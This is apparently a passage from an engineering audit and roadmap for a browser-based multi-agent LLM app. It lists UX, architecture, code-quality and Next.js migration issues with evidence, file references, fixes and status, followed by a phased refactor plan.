| UX-11 | Medium | Log panel: non-semantic tabs defaulting to raw "Technical", homemade filter with full-screen click-catcher, forced scroll-to-top on each entry | src/interface/ActionLogPanel.tsx:126-128,332,379-382,401-503 | shadcn `Tabs` (default activity), `DropdownMenuRadioGroup`, `ScrollArea`, `Collapsible`; auto-scroll only near top | M | panels | Fixed |
| UX-12 | Medium | Chat paste replaces the whole draft; no labels, live region or status for "thinking" | src/interface/ChatPanel.tsx:59-82,102-105,183-235 | Remove `handlePaste`/`simulateTyping`; labelled Textarea and Send; `role="log" aria-live="polite"`; `role="status"` indicator | S | panels | Fixed |
| UX-13 | Medium | Lead chat auto-closes and deselects 3 s after the brief is set (timer untracked) | src/core/agent/AgentBrain.ts:119-125 | Remove timer; success toast with "Close chat" action or explicit Done button | S | core | Partially fixed |
| UX-14 | Medium | Audit modal discards typed feedback on outside click; scrollbars hidden | src/interface/AuditModal.tsx:26,53-57,107,150,204-236 | `onInteractOutside` guard when dirty; drafts keyed by taskId; `ScrollArea`; `ToggleGroup` for revisions | M | modals | Partially fixed |
| UX-15 | Medium | Design mode: X only deselects, live edits revert silently, confirmations shown as red error banners | src/interface/VisualConfigurator/VisualConfigurator.tsx:138-176; TeamCard.tsx:92-181 | X always exits; "Discard unsaved changes?" AlertDialog; local drafts; AlertDialog for delete | M | configurator | Fixed |
| UX-16 | Medium | Kanban task card is a clickable div; the nested delete modal toggles the card when clicked | src/interface/KanbanPanel.tsx:63-98 | `Collapsible` with a button trigger; single portaled delete AlertDialog lifted to KanbanPanel | S | panels | Fixed |
| UX-17 | Low | Stale copy and naming from the media-generation product ("Generated March 2026", pricing headings, `pendingOutputPrompt`) | src/interface/{FinalOutputModal,PricingModal,OutputReviewModal,AuditModal,TeamFlowModal}.tsx; SystemDebugOverlay.tsx | Real `finalizedAt` timestamp; pricing as `Table`; rename to `pendingDeliverable`; remove leftover comments | S | modals | Partially fixed |
| UX-18 | Low | Production "Debug System" button in the design-mode header | src/interface/VisualConfigurator/VisualConfigurator.tsx:33-53; SystemDebugOverlay.tsx | Dev-only, or turn into "Export team JSON" dialog | S | configurator | Fixed |
| UX-19 | Low | Clipboard copy has no error handling or accessible feedback | src/interface/ActionLogPanel.tsx:18-37; FinalOutputModal.tsx:17-21; SystemDebugOverlay.tsx:14-18 | `copyToClipboard(text, label)` helper with Sonner success/error | S | panels | Fixed |
| UX-20 | Low | Two identical Maximize icons do different things; panel focus mode hides header with no Escape exit | src/interface/Header.tsx:86-92; SimulationView.tsx:54-60; src/App.tsx:83 | Distinct icons and tooltips; Escape + floating "Exit focus" button; consider dropping browser fullscreen | S | panels | Fixed |

**UX-01: Modals without dialog semantics (High)**
- Evidence: every overlay is a `fixed inset-0` div with a backdrop `onClick={onClose}`. A grep of `src/interface` finds no `role=`, `aria-` or Escape handler. Focus stays behind the overlay. Each `TaskCard` mounts its own `DeleteTaskModal`. SystemDebugOverlay says "Close with ESC" but has no key handler. `SimulationView` sets `body.style.overflow` and never cleans it up.
- Fix: run `npx shadcn add dialog alert-dialog`. Use controlled `<Dialog open onOpenChange>` with `DialogTitle`/`DialogDescription` for every modal, including the design-mode overlay (see MIG-08), and one `ConfirmDialog` for Reset, DeleteTask, OutputReview reset and TeamCard delete.

**UX-02: Review dismissal is destructive (High)**
- Evidence: the backdrop, X and footer button all call `handleCancelAndReset`, which opens a nested z-[120] "Are you absolutely sure?" overlay that ends in `resetProject()`. The only non-destructive exit is "Approve & Deliver".
- Fix: dismissing only hides the dialog and keeps the pending output. Add a reopen entry point (Inspector button plus a persistent toast). Make reset a separate secondary destructive action behind one AlertDialog.

**UX-03: Data loss without confirmation (High)**
- Evidence: `handleSwitch` → `setActiveTeam`, and the coreStore subscription at :449-453 calls `resetProject()`, wiping the brief, tasks, logs and token totals. "Remove from Team" removes the whole subagent subtree immediately. The same reset is guarded behind ResetModal in ProjectView.
- Fix: show an AlertDialog only when `phase !== 'idle'` or the log is non-empty. For agent removal, use an AlertDialog with the subtree count, or a toast with Undo.

**UX-04: No key onboarding (High)**
- Evidence: the only cue is a grey key icon with a `title`. The user can open the lead chat and send a message. `AgentBrain` throws "Gemini API key is required", and the BYOK modal then opens with an "API Error" banner.
- Fix: on mount with no key, open the BYOK dialog in onboarding mode with a neutral title and AI Studio link. Add a ProjectView `Alert` with an "Add API key" button, disable the chat buttons with an explanatory tooltip, and make `sendMessage` return early.

**UX-05: Mouse-only agent access (High)**
- Evidence: agents can only be selected through the canvas `InputManager` callback. AlertBubble is a `div` with `onClick` and no role, tabIndex or label. InspectorPanel has no back control. `KanbanPanel.handleSelectAgent` is defined but never wired.
- Fix: add a roster of ghost Buttons (avatar, name, status Badge) in ProjectView, a labelled Back button in the inspector, a button-based AlertBubble, a "Review" toast on `on_hold`, and clickable agent tags on Kanban cards.

**UX-06: Non-responsive fixed layout (High)**
- Evidence: ActionLogPanel `w-[320px]` and InspectorPanel `w-80` are always rendered. `isLogOpen` and `isKanbanOpen` are never set to false. On 375-800px viewports the canvas collapses. Design mode has 704px of fixed panels. The Kanban resize bar handles only `mousemove`/`mouseup`.
- Fix: add Header toggles for Logs and Tasks, use shadcn `ResizablePanelGroup` with collapsible side panels (this also fixes PERF-11), and switch to `Sheet` drawers below `lg`, including the configurator panels.

---

## Architecture and scalability (ARCH)

| ID | Severity | Title | Files | Recommendation | Effort | Owner | Status |
|---|---|---|---|---|---|---|---|
| ARCH-01 | High | Agent logic in src/core is hard-wired to Zustand singletons and UI actions | src/core/agent/AgentBrain.ts:3-5,39-40,121-124,148,172-201; PromptBuilder.ts:20; tools/*.ts | Ports in `src/core/orchestration/ports.ts` (`ProjectRepository`, `LlmGateway`, `OrchestratorEvents`); constructor-injected AgentBrain; pure PromptBuilder; tools as `(ctx, args) => ToolResult`; Zustand adapter | L | core | Partially fixed |
| ARCH-02 | High | Orchestration (AgentSimulation/AgentHost, no three.js code) lives in src/simulation and is owned by the WebGPU SceneManager; domain actions routed via `scene.getLeadBrain()` | src/simulation/core/{AgentSimulation,AgentHost}.ts; src/simulation/SceneManager.ts:70-72,245-267; src/interface/OutputReviewModal.tsx:29 | Move to `src/core/orchestration/`, typed; create in an app-level `OrchestratorProvider`; expose `sendChat`/`approveFinalOutput`/`resetProject`; scene only renders state | M | core | Partially fixed |
| ARCH-03 | High | Agent identity is a positional numeric index reused as GPU slot, store key and LLM agentId; add-after-remove creates duplicates; edits to the active team never reach the simulation or instance count | src/interface/VisualConfigurator/VisualConfigurator.tsx:182-255; src/integration/store/uiStore.ts:71-77; src/simulation/SceneManager.ts:144-156; src/simulation/core/AgentSimulation.ts:21-25,142-147 | Key domain state by `AgentNode.id`; index only as render slot; immediate fix `max(index)+1` + normalize/migrate; rebuild on roster hash change; block roster edits while `working` | L | core | Partially fixed |
| ARCH-04 | Medium | Simulation layer reads/writes stores directly, including per-frame `getState()` and task scans | src/simulation/SceneManager.ts (many); drivers/NpcAgentDriver.ts:44,59-61; entities/CharacterManager.ts:20,221; CharacterController.ts:104; world/WorldManager.ts:30 | Imperative SceneManager API (`setTeam`, `setChatState`, `setAgentActivity`, `setViewPaused`); single `sceneBridge.ts` with selector subscriptions | L | simulation | Partially fixed |
| ARCH-05 | Medium | coreStore mixes domain, telemetry and UI layout and is not scoped to a project/team; UI state typed in src/types.ts | src/integration/store/coreStore.ts:68-140; src/types.ts:5-50; src/integration/store/uiStore.ts:7-69 | Split `projectStore` (keyed by projectId), `telemetryStore`, `layoutStore`, `settingsStore`; domain types in `shared/` | L | core | Partially fixed |
| ARCH-06 | Medium | Persistence incoherent: coreStore `persist` saves nothing yet writes every update (reload loses all work); BYOK key persisted by hand in two places | src/integration/store/coreStore.ts:441-446; uiStore.ts:34-43; src/interface/BYOKModal.tsx:11,20-46; teamStore.ts:66-85 | Remove coreStore persist now (+`beforeunload` guard while working); `settingsStore` with persist v1 + legacy `byok-config` migration; later a versioned `ProjectRepository` (IndexedDB → Hono) | M | core | Partially fixed |
| ARCH-07 | Medium | No LLM gateway seam or shared contract; provider built inline per call with key from UI store; static export cannot host API routes | src/core/agent/AgentBrain.ts:40-43; src/core/llm/{types,pricing,constants}.ts; providers/GeminiProvider.ts | `shared/` zod contracts (LLMMessage, ToolDefinition, Task, Team); `createLLMProvider()` → BrowserGeminiGateway now, `HonoGateway` (`hc<AppType>`) later; scaffold `server/app.ts` `POST /api/llm/complete`, `GET /health` | M | backend | Partially fixed |
| ARCH-08 | Medium | Cross-store module-level subscriptions and import-time side effects | src/integration/store/coreStore.ts:5-6,449-454; uiStore.ts:4,10,34-43,71-77 | Store factories + one explicit `wireStores()` called from the client root; derive `instanceCount` | S | core | Partially fixed |
| ARCH-09 | Medium | No test infrastructure or pure seams for domain logic | package.json; coreStore.ts:197-323; ToolRegistry.ts; GeminiProvider.ts:97-170 | Vitest (node env); extract task reducers and Gemini mappers; first tests: transitions, tool definitions per phase, PromptBuilder, tool handlers vs in-memory repo | M | infra | Open |

**ARCH-01: Core coupled to stores and UI (High)**
- Evidence: `AgentBrain` reads `llmConfig.apiKey` from `useUiStore`, syncs history and logs through `useCoreStore`, and drives UI directly (`setChatting(false)` on a timer, `setBYOKOpen` on any error). `PromptBuilder` reads `useCoreStore.getState().tasks`. Every tool handler calls `useCoreStore.getState()`. None of this can run on a server or under unit tests.
- Fix: introduce `ProjectRepository`, `LlmGateway` and `OrchestratorEvents` ports. Inject them into AgentBrain and make prompts and tools pure functions of `(ctx, args)`. Add a Zustand adapter for the browser and a server adapter for Hono.

**ARCH-02: Orchestration owned by the renderer (High)**
- Evidence: `SceneManager` constructs `AgentSimulation` in its constructor and in `reinitializeSimulation`, owns the chat path (`coreHandler`), and exposes `getLeadBrain()`, which `OutputReviewModal` uses to approve output.
- Fix: move AgentSimulation and AgentHost (as Orchestrator and AgentRuntime) to `src/core/orchestration`, provide them through `OrchestratorProvider`/`useOrchestrator()`, and remove `setCoreHandler`/`getLeadBrain`/`sendMessage` from SceneManager.

**ARCH-03: Positional agent identity (High)**
- Evidence: `handleAddAgent` assigns `index: characters.length`, and `handleRemoveAgent` never reindexes. With the user at 0 and agents at 1-4, removing 2 and then adding one yields a second index 4. `instanceCount` and the simulation are rebuilt only when `selectedAgentSetId` changes, so agents added or edited on the active team are not rendered, have no brain, and `AgentHost.data` goes stale. Tasks and histories keep pointing at removed indices.
- Fix: immediately, use `Math.max(...indices)+1`, a `normalizeIndices` migration for persisted teams, and a rebuild on any roster-hash change. Structurally, key tasks, histories, statuses and usage by `AgentNode.id`, and let the scene map ids to dense GPU slots.

---

## Comprehensibility and code quality (CODE)

| ID | Severity | Title | Files | Recommendation | Effort | Owner | Status |
|---|---|---|---|---|---|---|---|
| CODE-01 | High | Technical log "System Tools" section is always empty: `any` typing hides a shape mismatch | src/interface/ActionLogPanel.tsx:47-49,155-181; src/core/agent/AgentBrain.ts:59-67; coreStore.ts:49-54; ToolRegistry.ts:44-47 | Type log entries (`LLMMessage[]`, `LLMToolDefinition[]`, `raw: unknown`); `getDefinitions(): LLMToolDefinition[]`; render `t.function.name` | S | panels | Fixed |
| CODE-02 | High | Dead state, actions and types in coreStore/uiStore/SceneManager left over from earlier features | src/integration/store/coreStore.ts:89-131,393-429; uiStore.ts:19,66; src/types.ts:5-9; AgentBrain.ts:104-127 | Delete boardroomHistories, agentSummaries, clearAllHistories, setKanbanOpen, `isLogOpen`→`setLogFilter`, chatMessages, isResolution, unused statuses; share `EMPTY_USAGE`/`MAX_DEBUG_LOG` | M | core | Fixed |
| CODE-03 | Medium | UI store typed as `CharacterState` in types.ts, with write-only and unused fields | src/types.ts:5-50; uiStore.ts:7-68; SceneContext.ts:4-11 | Colocate `UiState` in uiStore; delete unused fields; rename `AgentState` → `AgentWorkStatus` | S | core | Fixed |
| CODE-04 | Medium | Lead and user hard-coded as index 1 and 0 in ~12 places, elsewhere read from the team | PromptBuilder.ts:9; ToolRegistry.ts:45; tools/setUserBrief.ts, deliverProject.ts; AgentSimulation.ts:85; NpcAgentDriver.ts:52,156; AgentConfigPanel.tsx:34; AuditModal, KanbanPanel, AgentStatusPanel, UIOverlay | `isLeadAgent`/`isUserIndex`/`getAgentRole` helpers in src/data/agents.ts; pass `leadIndex` into prompt/tool builders | M | core | Partially fixed |
| CODE-05 | Medium | AgentBrain and tool handlers: dead flags, tautologies, narrating comments, `any` | src/core/agent/{AgentBrain,PromptBuilder,ToolRegistry}.ts; tools/*.ts; GeminiProvider.ts:39-75 | `ParsedToolCall` type; typed host interfaces; named constants (`HISTORY_WINDOW`); merge duplicate part loops | M | core | Fixed |
| CODE-06 | Medium | SceneManager carries dead chat-greeting code, unused callbacks, stale comments, magic numbers | src/simulation/SceneManager.ts:23-30,185-196,224-283,300-325,381-384 | Delete `_triggerNpcGreeting`, `moveNpcToBoardroom`, `coreHandler`; `InputCallbacks` object; hoist overlap/alpha constants | M | simulation | Fixed |
| CODE-07 | Medium | ActionLogPanel is 551 lines with duplicated serialization and tool-call JSX | src/interface/ActionLogPanel.tsx | Split into `logs/` (ActivityList, DebugEntryView, ToolCallCard, CopyButton); `serializeDebugEntry` in src/lib | M | panels | Fixed |
| CODE-08 | Medium | ChatPanel: dead typing simulator, commented-out code, misleading inline color comments | src/interface/ChatPanel.tsx:5-31,59-82,125-159 | Delete simulator/paste hack; Tailwind tokens instead of inline styles; `ReviewTaskCallout` component; type `LLMMessage.metadata` | S | panels | Fixed |
| CODE-09 | Medium | UIOverlay/InspectorPanel: dead modal state, `as any` casts, duplicated badge/avatar JSX | src/interface/UIOverlay.tsx:3-212; InspectorPanel.tsx:33,71-179 | Delete `isHelpOpen`/InfoModal render; `getAlertForAgent`; `FocusedAgentLabel`; shadcn Badge | S | panels | Fixed |
| CODE-10 | Medium | VisualConfigurator: pure tree helpers inside the component, duplicated recursion, `'user'` literals, `any` | src/interface/VisualConfigurator/{VisualConfigurator,AgentConfigPanel,TeamCard,TeamsPanel,flowUtils}.tsx | Move `updateAgentInTree`/`removeAgentFromTree`/`addSubagent` to src/data/agents.ts; `USER_ID`; typed React Flow handlers | M | configurator | Fixed |
| CODE-11 | Medium | Active-team lookups duplicated 14 times; `AgentSet` alias vs `AgenticSystem`; three duplicated upsert actions in teamStore | src/integration/store/teamStore.ts:1-99; src/data/agents.ts:7; panels | One `AgenticSystem` type; `upsertSystem`/`patchSystem` on a private helper; `useActiveAgents()` memoized hook | M | core | Fixed |
| CODE-12 | Medium | No ESLint or Prettier (`lint` is only `tsc --noEmit`); ~50 unused symbols; mixed styles | package.json:15-19; tsconfig.json | `strict`, `noUnusedLocals/Parameters`; ESLint 9 flat (`eslint-config-next`, `no-explicit-any: warn`); Prettier; run in CI | S | infra | Fixed (Biome, `strict: true`) |
| CODE-13 | Low | Rambling/stale comments, debug logging and unused constants in simulation | src/simulation/behavior/CharacterStateMachine.ts:66-137; drivers/NpcAgentDriver.ts; constants.ts:33-40 | Remove console.debug, unused constants; one-line "why" comments; `instanceof THREE.Mesh` | S | simulation | Fixed |
| CODE-14 | Low | Formatting helpers and section/usage JSX duplicated across panels | src/interface/{ProjectView,ActionLogPanel,AgentStatusPanel}.tsx | `src/lib/format.ts`; `SectionHeading`, `TokenUsageRow` components | S | panels | Fixed |
| CODE-15 | Low | App.tsx: wrong license header, misplaced import, unused selector, narrating comments; Kanban height constants duplicated | src/App.tsx:1-133; src/main.tsx | Clean up during the Next.js entry move; single `KANBAN_*` constants | S | panels | Fixed |
| CODE-16 | Low | KanbanPanel: fake `key` prop, misleading "consultation target" array, dead handlers | src/interface/KanbanPanel.tsx:1-108 | Remove; `AgentTag` component | S | panels | Fixed |
| CODE-17 | Low | Unused exports and over-specified LLM types; model, pricing and default defined in three places | src/core/llm/{constants,types,pricing}.ts; GeminiProvider.ts:88-93; src/integration/screenPositions.ts:19-21; src/theme/brand.ts | Single `MODELS` table deriving defaults/pricing; delete `LLMRequestDetails`, `getScreenPosition`, `USER_COLOR_MEDIUM` | S | core | Fixed |

**CODE-01: `any` hides a real bug (High)**
- Evidence: AgentBrain logs `systemTools: toolDefs` in the `{type:'function', function:{name}}` shape. ActionLogPanel sums `t.functionDeclarations?.length`, which is the Gemini `Tool[]` shape and is never logged. `totalTools` is therefore always 0 and the section is permanently empty. This compiles because `systemTools?: any[]` and `getDefinitions(): any[]`.
- Fix: type the log entries and `getDefinitions` as `LLMToolDefinition[]`, render `t.function.name`, and remove the `: any` annotations (lines 48, 172, 220, 271).

**CODE-02: Dead store surface (High)**
- Evidence: grep finds nothing outside coreStore that uses `boardroomHistories`, `appendBoardroomHistory`, `appendAgentHistory`, `agentSummaries`, `setAgentSummary`, `clearAllHistories` or `setKanbanOpen`. `isLogOpen`/`isKanbanOpen` are never set to false. Debug `status` `'pending'|'error'` is never produced. `uiStore.chatMessages`, `inspectorTab` and `isResolution` are unused too. Readers cannot tell live state from dead state, which raises the cost of ARCH-05.
- Fix: delete them in the slop-cleanup pass before splitting the stores. Move UI-only fields (viewMode, isResizing, isFinalOutputOpen, logFilter) to uiStore.

---

## Migration: Vite to Next.js static export + shadcn (MIG)

| ID | Severity | Title | Files | Recommendation | Effort | Owner | Status |
|---|---|---|---|---|---|---|---|
| MIG-01 | Critical | `import.meta.env.BASE_URL` in 3D asset paths throws under Next.js at module evaluation; scene never loads | src/simulation/constants.ts:15; world/WorldManager.ts:25; entities/CharacterManager.ts:75; src/vite-env.d.ts | `src/lib/base-path.ts` (`BASE_PATH` from `NEXT_PUBLIC_BASE_PATH`, `assetUrl()`); `OFFICE_MODEL_URL`/`CHARACTER_MODEL_URL` constants; delete vite-env.d.ts | S | simulation | Fixed |
| MIG-02 | High | App must be behind a client-only (`ssr:false`) boundary: three/webgpu imports and stores touch localStorage at import | src/App.tsx:15-16,63-77; src/main.tsx; uiStore.ts:34-43; teamStore.ts:68; coreStore.ts:443; Header.tsx:16,98-101 | Server `page.tsx` → `'use client'` `client-app.tsx` with `dynamic(() => import('@/App'), {ssr:false})`; layout never imports src/{core,integration,simulation,interface}; `@/*` → `./src/*` | S | panels | Fixed |
| MIG-03 | High | Replace Vite toolchain: next.config, scripts, deps, `@` alias, tsconfig; drop AI Studio leftovers | vite.config.ts; package.json:12-40; tsconfig.json; index.html; .github/workflows/release.yml; README.md:49 | `next.config.ts` (`output:'export'`, `basePath:'/the-delegation'`, `trailingSlash`, `images.unoptimized`, `reactStrictMode`, `env` for base path + version); postcss `@tailwindcss/postcss`; remove vite, plugin-react, @tailwindcss/vite, autoprefixer; add `@types/react(-dom)`; build tools to devDependencies | M | infra | Fixed |
| MIG-04 | High | Pages workflow uploads `./dist` (Next emits `./out`), no pinned Node, `npm install`, no typecheck, unpinned actions | .github/workflows/deploy.yml:16-27; release.yml | `setup-node@v4` (22, npm cache); `npm ci && npm run typecheck && npm run lint && npm run build`; `path: ./out`; `concurrency`; SHA-pinned actions + Dependabot; PR check job; size budget | S | infra | Fixed |
| MIG-05 | Medium | Relative logo paths and hard-coded favicon break under basePath | src/interface/Header.tsx:32-36; InfoModal.tsx:28-33; index.html:9 | `assetUrl()` or static import; shared `BrandLogo`; move favicon to `src/app/favicon.ico` | S | panels | Fixed |
| MIG-06 | Medium | index.html metadata, render-blocking third-party Google Fonts `@import` and `#root` styles must move to the App Router layout | index.html:7-27; src/index.css:1-32 | `metadata` export with absolute OG URLs; `next/font/google` Inter (self-hosted, `--font-sans`); `font-src 'self'` | S | panels | Fixed |
| MIG-07 | Medium | Brand colors split across a Tailwind token, TS constants in inline styles and hard-coded zinc classes | src/theme/brand.ts; src/index.css:28-30; KanbanPanel, InspectorPanel, ChatPanel, ProjectView | Define shadcn tokens (`--primary` #313437, `--user` #7EACEA, `--ring`, `--muted-foreground`); alias `--color-darkDelegation` during transition | M | core | Partially fixed |
| MIG-08 | Medium | Non-portaled design-mode overlay at z-[60] will cover shadcn portals at z-50 inside the team editor | src/App.tsx:114-129; AgentConfigPanel.tsx:187; InfoTooltip.tsx:55 | Make design mode a full-screen Dialog; z-scale rule: only portals use z-50, chrome z-10..40, no arbitrary z-[n] | S | panels | Fixed |
| MIG-09 | Medium | Button/badge styles are copy-pasted class strings (22 primary-button copies across 15 files) | AuditModal, ResetModal, BYOKModal, InspectorPanel, FinalOutputModal, KanbanPanel, PricingModal, ProjectView | `shadcn add button badge`; cva variants matching current look (uppercase, tracking, rounded-xl) | M | panels | Fixed |
| MIG-10 | Medium | 23 `animate-in/fade-in/zoom-in` classes are no-ops today and will all switch on when `tw-animate-css` is installed | src/index.css; AuditModal, InfoModal, TeamFlowModal, OutputReviewModal, AgentConfigPanel, UIOverlay, ProjectView, ActionLogPanel | Install `tw-animate-css`; same PR deletes ad-hoc animation classes on elements becoming shadcn primitives; remove `scale-in`, `custom-scrollbar`; `motion-safe:` for decorative pulses | S | panels | Fixed |
| MIG-11 | Low | Header imports the entire package.json (author email, deps) into the client bundle for the version | src/interface/Header.tsx:3,10 | `NEXT_PUBLIC_APP_VERSION` from next.config | S | panels | Fixed |

**MIG-01: `import.meta.env` crash (Critical)**
- Evidence: `export const DRACO_LIB_PATH = \`${import.meta.env.BASE_URL}vendor/draco/\`` runs at module scope, and both GLB loaders interpolate the same expression. `import.meta.env` is Vite-only. Under webpack/Turbopack it is undefined, so `.BASE_URL` throws as soon as any simulation module loads.
- Fix: one `assetUrl()` helper fed by `NEXT_PUBLIC_BASE_PATH`, which next.config sets from the same `basePath` constant. Keep all asset URLs in `constants.ts`.

**MIG-02: Client-only boundary (High)**
- Evidence: App statically imports `SceneManager` (three/webgpu and addons). `uiStore` reads `localStorage` inside `create()`, and `teamStore`/`coreStore` use `createJSONStorage(() => localStorage)`. `main.tsx` uses `document.getElementById`. `three-pathfinding` imports bare `three`, whose `require` export resolves to three.cjs.
- Fix: a server `page.tsx` rendering a `'use client'` wrapper with `next/dynamic(..., {ssr:false})`, since Next 15+ allows `ssr:false` only inside client components. Put `TooltipProvider`/`Toaster` inside the client boundary. Verify that three resolves to a single copy.

**MIG-03: Toolchain swap (High)**
- Evidence: `vite.config.ts` contains `base`, a dead `define`, an `@` alias that points at the repo root (unused), and an AI Studio HMR block with mojibake. vite is listed in both dependencies and devDependencies, `autoprefixer` is unused, and `@types/react` resolves only transitively.
- Fix: as in the table. Do not port the `define`, the HMR block or the alias target. Point `@/*` at `./src/*` to match shadcn `components.json`.

**MIG-04: Deploy workflow (High)**
- Evidence: the build is `npm install && npm run build` on whatever Node ubuntu-latest ships, with no cache. `upload-pages-artifact` uses `path: ./dist`, so a Next build would deploy nothing. There is no concurrency group, no typecheck and unpinned actions. release.yml has Spanish comments.
- Fix: as in the table. The artifact-based Pages deploy skips Jekyll, so `_next/` is served without `.nojekyll`. Note this in a comment.

---

## Roadmap

### Now (this refactor: Next.js, shadcn, cleanup, performance)
1. **Unblock the migration:** MIG-01, MIG-02, MIG-03, MIG-04, MIG-05, MIG-06, MIG-11, SEC-05, SEC-07.
2. **Stop the money leaks before StrictMode lands:** REL-02 (dispose), REL-01 (backoff, cap, budget), REL-03 (abort and timeout), REL-14.
3. **shadcn conversion with accessibility built in:** MIG-07 tokens → MIG-10 animations → MIG-09 Button/Badge → UX-01 Dialog/AlertDialog (with UX-02, UX-14) → MIG-08 z-scale → UX-07, UX-08, UX-09, UX-11, UX-12, UX-16, UX-19, UX-20. UX-03, UX-04 and UX-06 (Resizable/Sheet, which absorbs PERF-11) are in scope while the layout is being rebuilt.
4. **Security quick wins:** SEC-02 (shared Markdown component, which also covers PERF-07), SEC-04 CSP in the new layout, SEC-06, and the copy and opt-in part of SEC-01.
5. **Performance:** PERF-01, PERF-02, PERF-03 (dynamic imports come naturally with Next), PERF-04, PERF-05, PERF-08, PERF-09, PERF-10, PERF-12, PERF-13, PERF-14.
6. **Slop cleanup:** CODE-01 to CODE-17, REL-12, REL-13, REL-17, UX-13, UX-17, UX-18. Remove coreStore `persist` and consolidate BYOK persistence (ARCH-06, first half). Add CODE-12 lint and format so the cleanup stays clean.
7. **Hono scaffold, not wired:** `shared/` contracts and `server/app.ts` with `/api/health` and `/api/llm/complete` (ARCH-07, first half). Add `createLLMProvider()` so the browser path goes through the gateway interface.

### Next (backend adoption: LLM calls and key custody move to Hono, plus persistence)
1. **Ports first:** ARCH-01 (ports and pure core), ARCH-02 (orchestrator out of the scene), ARCH-08, ARCH-09 (tests on the pure core). These are the prerequisites for running agent logic server-side.
2. **Correct the orchestrator:** REL-04, REL-05, REL-06, REL-07, REL-09, REL-10, REL-11, REL-15, REL-16. Add REL-08 tool validation with zod schemas shared between client and server.
3. **Key custody:** `HonoGateway` becomes the default. `GEMINI_API_KEY` lives only as a server secret binding. BYOK becomes optional, sent only as an `x-user-gemini-key` header over HTTPS and never logged. Requests require a session or a signed anonymous token. Add per-user rate limits and spend quotas, and enforce REL-01 budgets on the server. This finishes SEC-01.
4. **Prompt hardening:** SEC-03 and PERF-06 (static system prompt, tagged and truncated context, capped history), applied in the server-side prompt builder.
5. **Persistence:** ARCH-06 second half and ARCH-05. Split the stores, add a versioned `ProjectRepository` (IndexedDB locally, then Hono plus a database), and resume `in_progress` tasks as `scheduled` on reload.
6. **Deploy:** move the app to a dedicated origin (custom domain or pages.dev) and host the Hono API next to it. Tighten `connect-src` to the API only.

### Later
1. ARCH-03: stable agent ids across domain state, with the GPU slot used only as a render mapping. Allow live roster edits during a run.
2. ARCH-04: the scene becomes a pure view driven by a single bridge, which enables headless or server-side runs without WebGPU.
3. Multi-project and multi-team history, shareable read-only project links, and server-side tool execution and audit logs.
4. Streaming responses and server-sent progress events. Run the orchestrator as a durable server job, so runs survive closing the tab.
5. Observability: per-run cost dashboards, error classification metrics, and replacing the in-browser debug log with server traces.
